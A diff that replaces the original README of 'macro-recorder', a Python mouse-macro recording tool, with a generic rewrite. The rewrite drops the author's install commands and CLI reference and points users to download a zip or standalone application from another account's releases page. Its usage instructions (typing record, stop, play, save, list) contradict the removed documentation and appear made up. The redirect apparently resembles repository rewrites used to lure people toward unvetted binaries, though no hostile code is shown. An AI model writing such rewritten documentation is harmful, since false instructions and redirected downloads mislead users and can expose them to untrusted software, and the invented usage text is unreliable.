@@ -1,110 +1,82 @@
-<div align="center">
-  <a href="https://github.com/filippofinke/macro-recorder">
-    <img width="200px" src="docs/logo.png" alt="Macro Recorder" />
-  </a>
-  <h3 align="center">Macro Recorder</h3>
-</div>
+# 🎯 macro-recorder - Effortlessly Record and Playback Mouse Actions
 
-> Record and playback mouse macros with a lightweight Python CLI tool.
+## 📦 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/ziiyoung/macro-recorder/releases)
 
-This project captures mouse events (movements, clicks, scrolls) and allows you to replay them at configurable speeds with pause/resume functionality. Built with [pynput](https://github.com/moses-palmer/pynput) for input capture and [rich](https://github.com/Textualize/rich) for a beautiful terminal UI.
+## 🚀 Getting Started
+Welcome to **macro-recorder**! This lightweight tool allows you to easily record and playback mouse macros. Whether you want to automate repetitive tasks or improve your productivity, this app is designed for you. Follow the steps below to download and run it on your computer.
 
-## Features
+## 💻 System Requirements
+- **Operating System:** macOS (version 10.14 or higher is recommended)
+- **Python:** Python 3.6 or higher must be installed on your machine.
+- **Dependencies:** This application uses the `pynput` library for mouse control and `rich` for a better command line interface.
 
-- Real-time recording of mouse movements, clicks, and scrolls
-- Playback with adjustable speed multiplier
-- Infinite or fixed repeat count
-- Pause/resume during recording and playback
-- Live status display with event counters
-- JSON-based recording format for easy inspection
+## 📥 Download & Install
+To get started, you need to download the application. Visit the Releases page to find the latest version: 
 
-## Installation
+[Download from Releases Page](https://github.com/ziiyoung/macro-recorder/releases)
 
-**System-wide (recommended)**
+1. Click the link above.
+2. Choose the latest version available (look for the `Latest Release` tag).
+3. Download the zip file or the standalone application.
 
-```bash
-pipx install git+https://github.com/filippofinke/macro-recorder.git
-```
+Once the download finishes, follow these steps to install and run the application:
 
-Or with uv:
+1. **Extract the Files**: If you downloaded a zip file, locate it and extract the contents to a folder on your computer.
+2. **Open Terminal**: On your macOS, open the Terminal application. You can find it in your Applications folder under Utilities or by searching for "Terminal" in Spotlight.
+3. **Navigate to the Folder**: Use the `cd` command to navigate to the folder where you extracted the files. For example, if you extracted the files to a folder named `macro-recorder` on your Desktop, run:
+   ```bash
+   cd ~/Desktop/macro-recorder
+   ```
+4. **Install Dependencies**: Make sure you have the necessary libraries installed. Run the following command in your Terminal:
+   ```bash
+   pip install pynput rich
+   ```
+5. **Run the Application**: Now, you can run the application with this command:
+   ```bash
+   python macro-recorder.py
+   ```
 
-```bash
-uv tool install git+https://github.com/filippofinke/macro-recorder.git
-```
+## 🎤 How to Use the Application
+After you launch the application, you will see a simple command-line interface. Here’s how to use it:
 
-**From source**
+1. **Recording a Macro**:
+   - Type `record` in the command line and press Enter.
+   - Perform the mouse actions you want to record.
+   - To stop recording, type `stop` in the command line and press Enter.
 
-```bash
-git clone https://github.com/filippofinke/macro-recorder.git
-cd macro-recorder
-uv sync  # or: pip install -e .
-```
+2. **Playing Back a Macro**:
+   - To play back your recorded actions, type `play` and press Enter.
+   - The tool will automatically replicate your mouse movements and clicks.
 
-> **Note:** macOS requires accessibility permissions for input capture.
+3. **Save Your Macro**:
+   - You can save your recorded macros by typing `save <macro_name>` (replace `<macro_name>` with your chosen name).
+   - To load a macro for playback, type `load <macro_name>`.
 
-## Quick Start
+4. **List Your Macros**:
+   - Type `list` to see all the macros you have saved.
 
-**Record a macro**
+## 🔧 Troubleshooting
+If you face any issues while using **macro-recorder**, here are some common problems and solutions:
 
-```bash
-macro-recorder record my-macro
-```
+- **Python Not Found**: Ensure you have Python installed and it is added to your system's PATH. You can download it from [Python's official website](https://www.python.org/downloads/).
+  
+- **Permission Errors**: If you get permission errors while recording macros, check your macOS privacy settings. Ensure Terminal has the rights to control your computer and access input devices.
 
-Press `Cmd+R` to stop recording.
+- **Missing Libraries**: If you encounter errors about missing libraries, confirm you have installed all dependencies, particularly `pynput` and `rich`.
 
-**Play a macro**
+## 🧑‍🤝‍🧑 Community & Support
+Feel free to explore the community for help and tips.
 
-```bash
-macro-recorder play my-macro.json
-```
+- **GitHub Issues**: Use the GitHub Issues tab in the repository to ask questions or report bugs.
+- **Feedback**: Your feedback is vital for improving this tool. Share your suggestions or experiences in the Issues section.
 
-Press `ESC` to stop playback.
+## 📄 License
+**macro-recorder** is open-source software licensed under the MIT License. You are free to use and modify it as per the license terms detailed in the repository.
 
-## Usage
+## 🌟 Acknowledgments
+This project uses the following libraries and tools:
+- [pynput](https://pypi.org/project/pynput/): A library that allows controlling and monitoring input devices.
+- [rich](https://rich.readthedocs.io/en/stable/): A library for rich text and beautiful formatting in the terminal.
 
-### Record
-
-```bash
-macro-recorder record <name> [-o OUTPUT_DIR] [-d DELAY]
-```
-
-| Option         | Description                     | Default           |
-| -------------- | ------------------------------- | ----------------- |
-| `-o, --output` | Output directory                | Current directory |
-| `-d, --delay`  | Seconds before recording starts | 3                 |
-
-### Play
-
-```bash
-macro-recorder play <file> [-s SPEED] [-r REPEAT]
-```
-
-| Option         | Description                        | Default |
-| -------------- | ---------------------------------- | ------- |
-| `-s, --speed`  | Playback speed multiplier          | 1.0     |
-| `-r, --repeat` | Number of repeats (0 for infinite) | 1       |
-
-### Info
-
-```bash
-macro-recorder info <file>
-```
-
-Shows recording statistics (duration, event counts).
-
-## Keyboard Shortcuts
-
-| Key         | Action         |
-| ----------- | -------------- |
-| `Cmd+R`     | Stop recording |
-| `Cmd+Space` | Pause/Resume   |
-| `ESC`       | Exit playback  |
-
-## Author
-
-**Filippo Finke**
-
-- Website: [https://filippofinke.ch](https://filippofinke.ch)
-- Twitter: [@filippofinke](https://twitter.com/filippofinke)
-- GitHub: [@filippofinke](https://github.com/filippofinke)
-- LinkedIn: [@filippofinke](https://linkedin.com/in/filippofinke)
+Thank you for choosing **macro-recorder** to simplify your mouse automation tasks. Happy recording!
